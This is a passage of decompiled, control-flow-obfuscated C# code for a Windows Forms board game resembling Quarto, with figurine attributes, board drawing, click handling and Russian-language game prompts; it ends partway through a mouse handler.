using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = 1521332250;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x348E4971u) % 4u)
					{
					case 3u:
						Dark = dark;
						num = (int)(num2 * 653129038) ^ -1508307711;
						continue;
					case 2u:
						Big = big;
						num = (int)(num2 * 542980971) ^ -1579700358;
						continue;
					case 0u:
						break;
					default:
						Square = square;
						Point = point;
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 203716548;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x7D4E0D3Cu) % 6u)
					{
					case 5u:
						Big = copy.Big;
						num = ((int)num2 * -698207415) ^ -1912172785;
						continue;
					case 4u:
						num = ((int)num2 * -773431005) ^ -1873761947;
						continue;
					case 2u:
						Square = copy.Square;
						Point = copy.Point;
						num = ((int)num2 * -744106284) ^ 0x38816F85;
						continue;
					case 1u:
						Dark = copy.Dark;
						num = ((int)num2 * -712951852) ^ -148535175;
						continue;
					default:
						return;
					case 0u:
						break;
					case 3u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		InitializeComponent();
		Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
		pictureBox = new PictureBox[4, 4];
		borderBox = new PictureBox[4, 4];
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 4; j++)
			{
				double num = ((j < 2) ? 0.0 : 4.1);
				PictureBox[,] array = pictureBox;
				int num2 = i;
				int num3 = j;
				PictureBox obj = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
				Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)j + num) * (double)size), 4 + i * size));
				Form1.smethod_5((Control)(object)obj, Color.White);
				array[num2, num3] = obj;
				Form1.smethod_6((Control)(object)pictureBox[i, j], new MouseEventHandler(PictureBoxIJ_MouseDown));
				PictureBox[,] array2 = borderBox;
				int num4 = i;
				int num5 = j;
				PictureBox obj2 = Form1.smethod_2();
				Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
				Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)j + num) * (double)size), 1 + i * size));
				Form1.smethod_7((Control)(object)obj2, bool_0: false);
				array2[num4, num5] = obj2;
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[i, j]);
				Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[i, j]);
			}
		}
		Form3 form_ = new Form3();
		Form1.smethod_10((Form)(object)form_, (Form)(object)this);
		menu = (Form)(object)form_;
		Form1.smethod_11((Control)(object)menu);
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -629033838;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB0B0A576u) % 9u)
				{
				case 8u:
					num = ((int)num2 * -1551874559) ^ -335162534;
					continue;
				case 7u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -610093392) ^ -661666022;
					continue;
				case 6u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = -1288362509;
					continue;
				}
				case 4u:
					num = (int)(num2 * 455926950) ^ -1795750573;
					continue;
				case 3u:
					num = ((int)num2 * -1718816884) ^ -1093366447;
					continue;
				case 2u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) >= 296)
					{
						num = -1946894615;
						num3 = -1946894615;
					}
					else
					{
						num = -516032597;
						num3 = -516032597;
					}
					continue;
				}
				case 1u:
					Form1.smethod_14(menu);
					num = (int)((num2 * 747000886) ^ 0xEF15AA3);
					continue;
				default:
					return;
				case 0u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num = 134196386;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x3B4D6138u) % 20u)
				{
				case 17u:
				{
					int num6;
					if (num3 < 4)
					{
						num = 155649478;
						num6 = 155649478;
					}
					else
					{
						num = 517894529;
						num6 = 517894529;
					}
					continue;
				}
				case 16u:
					num3 = 0;
					num = ((int)num2 * -1037194381) ^ 0x6E7C5E8D;
					continue;
				case 15u:
					num = (int)(num2 * 1677824813) ^ -277492303;
					continue;
				case 14u:
					num4 = 0;
					num = 77611905;
					continue;
				case 13u:
					num = (int)(num2 * 6478137) ^ -2117238322;
					continue;
				case 12u:
					num = (int)((num2 * 638684977) ^ 0x5B9F1E38);
					continue;
				case 11u:
					num = (int)(num2 * 1199985056) ^ -1594014528;
					continue;
				case 10u:
					num = ((int)num2 * -2131903478) ^ -848948192;
					continue;
				case 9u:
				{
					int num5;
					if (num4 >= 4)
					{
						num = 1138621925;
						num5 = 1138621925;
					}
					else
					{
						num = 1819465354;
						num5 = 1819465354;
					}
					continue;
				}
				case 8u:
					num4++;
					num = (int)(num2 * 1531968353) ^ -1416680227;
					continue;
				case 7u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: false);
					num = ((int)num2 * -285952309) ^ -1396763449;
					continue;
				case 6u:
					storage[num3, num4] = new Figurine(num3 < 2, num4 % 2 == 0, num4 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = 1022194263;
					continue;
				case 5u:
					Paint_Board();
					num = (int)((num2 * 180056095) ^ 0x6DC35CA2);
					continue;
				case 4u:
					Paint_Storage();
					num = (int)((num2 * 865639994) ^ 0x3586973C);
					continue;
				case 3u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 1774793522) ^ 0x5D4D20CD);
					continue;
				case 2u:
					storage = new Figurine[4, 4];
					num = ((int)num2 * -459010332) ^ -2102060024;
					continue;
				case 1u:
					num3++;
					num = (int)(num2 * 1514100680) ^ -316123155;
					continue;
				case 0u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1043586173) ^ -1705764209;
					continue;
				default:
					return;
				case 19u:
					break;
				case 18u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num3 = default(int);
		int num5 = default(int);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num12 = default(float);
		float num7 = default(float);
		bool point = default(bool);
		float num6 = default(float);
		float num16 = default(float);
		float num13 = default(float);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1515417837;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEAB4AE95u) % 42u)
				{
				case 41u:
					num3++;
					num = (int)((num2 * 599407550) ^ 0x583EA797);
					continue;
				case 40u:
				{
					int num21;
					if (board[num3, num5].Big)
					{
						num = -1724190275;
						num21 = -1724190275;
					}
					else
					{
						num = -45481127;
						num21 = -45481127;
					}
					continue;
				}
				case 39u:
					Form1.smethod_24(graphics_, brush_, num12 + (float)(num5 * size), num12 + (float)(num3 * size), num7, num7);
					num = -1909336493;
					continue;
				case 38u:
					point = board[num3, num5].Point;
					num = ((int)num2 * -1234464868) ^ -1549084161;
					continue;
				case 37u:
					num = -2146922717;
					continue;
				case 36u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)(num2 * 1565036122) ^ -1927224678;
					continue;
				case 35u:
					num7 = num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 671902297) ^ 0x6AB3B140);
					continue;
				case 34u:
					num = ((int)num2 * -1681260873) ^ 0x5F2BBFD8;
					continue;
				case 33u:
					num3 = 0;
					num = (int)((num2 * 749845768) ^ 0x312CA8B5);
					continue;
				case 32u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num12 + (float)(num5 * size), num12 + (float)(num3 * size), num7, num7);
					num = (int)(num2 * 54208387) ^ -549857379;
					continue;
				case 31u:
					brush_ = Form1.smethod_26();
					num = -86467187;
					continue;
				case 30u:
					num5 = 0;
					num = -1051107148;
					continue;
				case 29u:
					num = -1514513206;
					continue;
				case 28u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -2048019945) ^ -1032456131;
					continue;
				case 27u:
					num = (int)((num2 * 1152532226) ^ 0x464A47C7);
					continue;
				case 26u:
					num5++;
					num = (int)((num2 * 1995829251) ^ 0x7A46596);
					continue;
				case 24u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1287051785) ^ -1808452012;
					continue;
				case 23u:
					num16 = 1f - num13 * 0.4f / (float)Form1.smethod_27(2.0);
					num12 = (float)size * (num16 / 2f);
					num = -1573938024;
					continue;
				case 22u:
				{
					int num19;
					int num20;
					if (!flag2)
					{
						num19 = 2100368518;
						num20 = 2100368518;
					}
					else
					{
						num19 = 1531857096;
						num20 = 1531857096;
					}
					num = num19 ^ ((int)num2 * -1330376773);
					continue;
				}
				case 21u:
				{
					int num17;
					int num18;
					if (!flag)
					{
						num17 = 454843294;
						num18 = 454843294;
					}
					else
					{
						num17 = 1271145262;
						num18 = 1271145262;
					}
					num = num17 ^ ((int)num2 * -397710984);
					continue;
				}
				case 20u:
					num = (int)((num2 * 905232444) ^ 0x1759C486);
					continue;
				case 19u:
					num16 = 1f - num13 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -803265676;
					continue;
				case 18u:
					num = ((int)num2 * -1141142511) ^ 0x2A459745;
					continue;
				case 17u:
					Form1.smethod_28(graphics_, brush_, num12 + (float)(num5 * size), num12 + (float)(num3 * size), num7, num7);
					num = ((int)num2 * -1379040836) ^ 0x32E700E5;
					continue;
				case 16u:
					num12 = (float)size * (num16 / 2f);
					num = (int)(num2 * 466597351) ^ -1498062918;
					continue;
				case 14u:
					num13 = 1f;
					num = (int)(num2 * 1043842810) ^ -1621911093;
					continue;
				case 13u:
					num6 = (float)size * num13;
					num = ((int)num2 * -762875729) ^ 0x6BAC833E;
					continue;
				case 12u:
					num = -1703453034;
					continue;
				case 11u:
				{
					int num14;
					int num15;
					if (!board[num3, num5].Dark)
					{
						num14 = 634496286;
						num15 = 634496286;
					}
					else
					{
						num14 = 967381009;
						num15 = 967381009;
					}
					num = num14 ^ ((int)num2 * -2008762020);
					continue;
				}
				case 10u:
					num = (int)((num2 * 219722306) ^ 0x7E4EE191);
					continue;
				case 9u:
					flag2 = num5 < 4;
					num = -1660954185;
					continue;
				case 8u:
					num = (int)((num2 * 1418946836) ^ 0x5CE1F64E);
					continue;
				case 7u:
					num = ((int)num2 * -409225950) ^ 0x39B00912;
					continue;
				case 6u:
					num13 = 0.7f;
					num = -1220846054;
					continue;
				case 5u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -785385741) ^ -1228975247;
					continue;
				case 4u:
				{
					int num10;
					int num11;
					if (!point)
					{
						num10 = 522452271;
						num11 = 522452271;
					}
					else
					{
						num10 = 1368763315;
						num11 = 1368763315;
					}
					num = num10 ^ (int)(num2 * 1157630180);
					continue;
				}
				case 3u:
				{
					num7 = num6 * 0.9f / (float)Form1.smethod_27(2.0);
					int num8;
					int num9;
					if (!board[num3, num5].Square)
					{
						num8 = 1929374566;
						num9 = 1929374566;
					}
					else
					{
						num8 = 396536178;
						num9 = 396536178;
					}
					num = num8 ^ (int)(num2 * 152663648);
					continue;
				}
				case 2u:
					flag = board[num3, num5] != null;
					num = ((int)num2 * -1860848731) ^ -1264057670;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num5 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -154691249) ^ -1809737363;
					continue;
				case 0u:
				{
					int num4;
					if (num3 < 4)
					{
						num = -1748032091;
						num4 = -1748032091;
					}
					else
					{
						num = -621033003;
						num4 = -621033003;
					}
					continue;
				}
				default:
					return;
				case 25u:
					break;
				case 15u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num3 = default(int);
		int num4 = default(int);
		float num9 = default(float);
		float num8 = default(float);
		float num14 = default(float);
		float num6 = default(float);
		bool point = default(bool);
		float num7 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		bool flag = default(bool);
		while (true)
		{
			int num = 1314898042;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x29D6EE1u) % 33u)
				{
				case 32u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = 905758726;
					continue;
				case 31u:
					num = ((int)num2 * -123214476) ^ 0x3370B6F4;
					continue;
				case 30u:
					num9 = 1f - num8 * 0.9f / (float)Form1.smethod_27(2.0);
					num14 = (float)size * num8;
					num6 = (float)size * (num9 / 2f) - 4f;
					num = 210968840;
					continue;
				case 29u:
				{
					int num17;
					int num18;
					if (point)
					{
						num17 = 839699983;
						num18 = 839699983;
					}
					else
					{
						num17 = 1491401968;
						num18 = 1491401968;
					}
					num = num17 ^ ((int)num2 * -1213774276);
					continue;
				}
				case 28u:
					num7 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1717251061) ^ -237313862;
					continue;
				case 27u:
					num = (int)(num2 * 425419117) ^ -1778636350;
					continue;
				case 26u:
					num = ((int)num2 * -282256126) ^ 0x50BDD597;
					continue;
				case 25u:
					num = ((int)num2 * -72532697) ^ -999062029;
					continue;
				case 24u:
					num8 = 1f;
					num = ((int)num2 * -1235664841) ^ -319085242;
					continue;
				case 23u:
					num6 = (float)size * (num9 / 2f) - 4f;
					num = ((int)num2 * -1773220385) ^ -422220631;
					continue;
				case 22u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num3, num4]), Form1.smethod_16((Control)(object)pictureBox[num3, num4])));
					num = (int)(num2 * 1930338329) ^ -1790665665;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, brush_, num6, num6, num7, num7);
					num = 793979905;
					continue;
				case 20u:
					num3 = 0;
					num = ((int)num2 * -1829452457) ^ -180222925;
					continue;
				case 19u:
					num4 = 0;
					num = 165729826;
					continue;
				case 18u:
					num4++;
					num = 165729826;
					continue;
				case 17u:
				{
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num3, num4]));
					int num19;
					int num20;
					if (!storage[num3, num4].Dark)
					{
						num19 = -600033286;
						num20 = -600033286;
					}
					else
					{
						num19 = -1186226245;
						num20 = -1186226245;
					}
					num = num19 ^ (int)(num2 * 1392072271);
					continue;
				}
				case 16u:
				{
					int num15;
					int num16;
					if (num4 < 2)
					{
						num15 = 1858715381;
						num16 = 1858715381;
					}
					else
					{
						num15 = 1339424687;
						num16 = 1339424687;
					}
					num = num15 ^ ((int)num2 * -131195356);
					continue;
				}
				case 15u:
					num7 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					point = storage[num3, num4].Point;
					num = (int)(num2 * 1255915272) ^ -2000574480;
					continue;
				case 13u:
					num = (int)((num2 * 879203083) ^ 0x56C42D56);
					continue;
				case 11u:
					num8 = 0.7f;
					num = 535160064;
					continue;
				case 10u:
				{
					int num13;
					if (num3 >= 4)
					{
						num = 889788090;
						num13 = 889788090;
					}
					else
					{
						num = 1465882981;
						num13 = 1465882981;
					}
					continue;
				}
				case 9u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1512868153) ^ 0x2FB909D4);
					continue;
				case 8u:
					Form1.smethod_28(graphics_, brush_, num6, num6, num7, num7);
					num = ((int)num2 * -751648945) ^ 0x33E863CD;
					continue;
				case 7u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = -1741254795;
						num12 = -1741254795;
					}
					else
					{
						num11 = -2024248994;
						num12 = -2024248994;
					}
					num = num11 ^ ((int)num2 * -738011443);
					continue;
				}
				case 6u:
				{
					int num10;
					if (storage[num3, num4] == null)
					{
						num = 905758726;
						num10 = 905758726;
					}
					else
					{
						num = 1556514126;
						num10 = 1556514126;
					}
					continue;
				}
				case 5u:
					num3++;
					num = (int)((num2 * 744905508) ^ 0x15457B2);
					continue;
				case 4u:
					num9 = 1f - num8 * 0.4f / (float)Form1.smethod_27(2.0);
					num = 994678343;
					continue;
				case 3u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num6, num6, num7, num7);
					num = ((int)num2 * -418429238) ^ -1557896749;
					continue;
				case 2u:
					flag = num4 < 4;
					num = 27563692;
					continue;
				case 1u:
					brush_ = Form1.smethod_26();
					num = 3091489;
					continue;
				case 0u:
				{
					int num5;
					if (!storage[num3, num4].Big)
					{
						num = 1070150717;
						num5 = 1070150717;
					}
					else
					{
						num = 1922125643;
						num5 = 1922125643;
					}
					continue;
				}
				default:
					return;
				case 14u:
					break;
				case 12u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		int num3 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num = 283320870;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x249F6FEFu) % 28u)
				{
				case 27u:
					num3 = 0;
					num = 1435596186;
					continue;
				case 26u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 717142516) ^ -422302210;
					continue;
				case 25u:
					Form1_Load(this, Form1.smethod_31());
					num = (int)(num2 * 314636613) ^ -2080004538;
					continue;
				case 24u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num3], bool_0: true);
					num = 297969185;
					continue;
				case 22u:
					num = ((int)num2 * -1330131625) ^ 0x5F64C2F8;
					continue;
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 170071690) ^ 0x438B7883);
					continue;
				case 20u:
					num = (int)((num2 * 1444987164) ^ 0x131AC2FB);
					continue;
				case 19u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = 2039529571;
					continue;
				case 18u:
					step = 0;
					num = (int)(num2 * 2074256008) ^ -759459395;
					continue;
				case 17u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -568166582) ^ -1608994709;
					continue;
				case 16u:
					num5++;
					num = (int)((num2 * 1622640496) ^ 0x4D2BCC5B);
					continue;
				case 15u:
					Form1.smethod_36(timer1);
					num = (int)((num2 * 2119274721) ^ 0x310E0D3A);
					continue;
				case 14u:
				{
					int num9;
					int num10;
					if (turn)
					{
						num9 = 1562513606;
						num10 = 1562513606;
					}
					else
					{
						num9 = 1340406200;
						num10 = 1340406200;
					}
					num = num9 ^ ((int)num2 * -1628131089);
					continue;
				}
				case 13u:
				{
					int num7 = Form1.smethod_33(rnd, 4);
					int num8 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.Blue);
					num = 1335982021;
					continue;
				}
				case 12u:
				{
					int num6;
					if (num5 < 4)
					{
						num = 633606960;
						num6 = 633606960;
					}
					else
					{
						num = 845303534;
						num6 = 845303534;
					}
					continue;
				}
				case 11u:
					num = ((int)num2 * -2036139345) ^ -1554292587;
					continue;
				case 10u:
					num3++;
					num = (int)(num2 * 388239778) ^ -1222043706;
					continue;
				case 9u:
					num = (int)(num2 * 1266836313) ^ -1444164451;
					continue;
				case 8u:
					num = ((int)num2 * -281080213) ^ -1366915731;
					continue;
				case 7u:
					num5 = 0;
					num = (int)((num2 * 112069233) ^ 0x3C01748);
					continue;
				case 5u:
				{
					int num4;
					if (num3 >= 4)
					{
						num = 570025651;
						num4 = 570025651;
					}
					else
					{
						num = 463554243;
						num4 = 463554243;
					}
					continue;
				}
				case 4u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = ((int)num2 * -976006173) ^ 0x6B7A95F7;
					continue;
				case 3u:
					num = (int)(num2 * 1730570647) ^ -1606604323;
					continue;
				case 2u:
					step = 1;
					num = ((int)num2 * -30211220) ^ 0x661C0A30;
					continue;
				case 1u:
					num = (int)((num2 * 47679275) ^ 0x999DCF3);
					continue;
				case 0u:
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -1490156673) ^ 0x72F8245E;
					continue;
				default:
					return;
				case 23u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		time = time.AddSeconds(1.0);
		Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0221: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		int num9 = default(int);
		int num3 = default(int);
		Point point = default(Point);
		int num7 = default(int);
		int num6 = default(int);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -571956590;
			while (true)
			{
				uint num2;
				int num8;
				switch ((num2 = (uint)num ^ 0x9BCC7D01u) % 24u)
				{
				case 23u:
					num = ((int)num2 * -1151402046) ^ -668606571;
					continue;
				case 22u:
					num9++;
					num = (int)((num2 * 2031671100) ^ 0x4B0A62A3);
					continue;
				case 21u:
					Form1.smethod_5((Control)(object)borderBox[num9, num3], Color.White);
					num3++;
					num = -1516308935;
					continue;
				case 20u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -1238295177) ^ -1564554267;
					continue;
				case 19u:
					num = ((int)num2 * -1857562776) ^ 0x2FC42FF3;
					continue;
				case 18u:
					num9 = 0;
					num = (int)((num2 * 109843270) ^ 0x54FF174E);
					continue;
				case 16u:
				{
					num7 = point.X / size;
					int num12;
					int num13;
					if (num7 <= 1)
					{
						num12 = -1298979994;
						num13 = -1298979994;
					}
					else
					{
						num12 = -740715030;
						num13 = -740715030;
					}
					num = num12 ^ ((int)num2 * -1711504763);
					continue;
				}
				case 15u:
					if (storage[num6, num7] != null)
					{
						num = -469837316;
						continue;
					}
					num8 = 0;
					goto IL_00f7;
				case 14u:
					Form1.smethod_5((Control)(object)borderBox[num6, num7], Color.Red);
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1734190108) ^ -359096320;
					continue;
				case 13u:
				{
					int num14;
					int num15;
					if (flag3)
					{
						num14 = 1026802780;
						num15 = 1026802780;
					}
					else
					{
						num14 = 1960274269;
						num15 = 1960274269;
					}
					num = num14 ^ ((int)num2 * -1282387462);
					continue;
				}
				case 12u:
					num3 = 0;
					num = -1521162811;
					continue;
				case 11u:
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num6 = point.Y / size;
					num = (int)(num2 * 1530912577) ^ -854245954;
					continue;
				case 10u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -1821995767;
						num11 = -1821995767;
					}
					else
					{
						num10 = -1806374733;
						num11 = -1806374733;
					}
					num = num10 ^ ((int)num2 * -1223675114);
					continue;
				}
				case 9u:
					num = ((int)num2 * -1014283019) ^ -1400863797;
					continue;
				case 8u:
					num = ((int)num2 * -1741594830) ^ 0x6AAECCEF;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 540479093) ^ -401349478;
					continue;
				case 5u:
					num8 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num6, num7]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00f7;
				case 4u:
					num = ((int)num2 * -932726034) ^ 0x2269801;
					continue;
				case 3u:
					num7 -= 4;
					num = (int)((num2 * 1319552571) ^ 0x4C5077AF);
					continue;
				case 2u:
					flag2 = num9 < 4;
					num = -85645757;
					continue;
				case 1u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -1310085870;
						num5 = -1310085870;
					}
					else
					{
						num4 = -1421521831;
						num5 = -1421521831;
					}
					num = num4 ^ ((int)num2 * -1194273611);
					continue;
				}
				case 0u:
					flag = num3 < 4;
					num = -1938999040;
					continue;
				default:
					return;
				case 17u:
					break;
				case 6u:
					return;
					IL_00f7:
					flag3 = (byte)num8 != 0;
					num = -1604464684;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_02df: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f5: Expected O, but got Unknown
		bool flag2 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num7 = default(int);
		bool flag3 = default(bool);
		int num3 = default(int);
		int num12 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -852184843;
			while (true)
			{
				uint num2;
				int num11;
				switch ((num2 = (uint)num ^ 0x8B1A4CB4u) % 29u)
				{
				case 28u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = -99232047;
						num9 = -99232047;
					}
					else
					{
						num8 = -62630788;
						num9 = -62630788;
					}
					num = num8 ^ ((int)num2 * -773000029);
					continue;
				}
				case 27u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num6 + 0.05f) * (float)size, ((float)num7 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 622072147) ^ 0x7AA68864);
					continue;
				case 26u:
					flag3 = Form1.smethod_41((Control)(object)borderBox[num3, num12]) == Color.Blue;
					num = -1198561609;
					continue;
				case 25u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -26645013) ^ 0x49D712D;
					continue;
				case 24u:
					num = (int)((num2 * 1361758922) ^ 0x6FAC70BC);
					continue;
				case 22u:
					num = (int)((num2 * 1931261862) ^ 0x7A3D131);
					continue;
				case 21u:
					num6 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1279632779) ^ -2064788059;
					continue;
				case 19u:
				{
					int num10;
					if (num3 >= 4)
					{
						num = -1114302079;
						num10 = -1114302079;
					}
					else
					{
						num = -1752371548;
						num10 = -1752371548;
					}
					continue;
				}
				case 18u:
					num = (int)(num2 * 1187057954) ^ -59734498;
					continue;
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 1125316045) ^ -1363603174;
					continue;
				case 16u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = ((int)num2 * -1216289323) ^ -1083776739;
					continue;
				case 15u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -331716184) ^ 0x2E24D5EE;
					continue;
				case 14u:
				{
					int num13;
					int num14;
					if (flag3)
					{
						num13 = -1106864607;
						num14 = -1106864607;
					}
					else
					{
						num13 = -792163064;
						num14 = -792163064;
					}
					num = num13 ^ ((int)num2 * -2062919806);
					continue;
				}
				case 13u:
					num12++;
					num = -151202678;
					continue;
				case 12u:
					flag2 = num12 < 4;
					num = -630550579;
					continue;
				case 11u:
					num3++;
					num = (int)((num2 * 202918642) ^ 0x6563D070);
					continue;
				case 10u:
					num = (int)(num2 * 336915756) ^ -1116130707;
					continue;
				case 9u:
					Paint_Board();
					num = (int)(num2 * 2141197325) ^ -700214425;
					continue;
				case 8u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num12]), num6 * size + 4, num7 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1572057264) ^ 0x6171826;
					continue;
				case 7u:
					num12 = 0;
					num = -151202678;
					continue;
				case 6u:
					num11 = ((board[num7, num6] == null) ? 1 : 0);
					goto IL_02bb;
				case 5u:
					num7 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1898895162) ^ -1123077704;
						continue;
					}
					num11 = 0;
					goto IL_02bb;
				case 4u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = -287653518;
						num5 = -287653518;
					}
					else
					{
						num4 = -765906841;
						num5 = -765906841;
					}
					num = num4 ^ (int)(num2 * 1607513849);
					continue;
				}
				case 3u:
					Form1.smethod_45(graphics_);
					num = (int)((num2 * 331497979) ^ 0x6D29297A);
					continue;
				case 2u:
					num3 = 0;
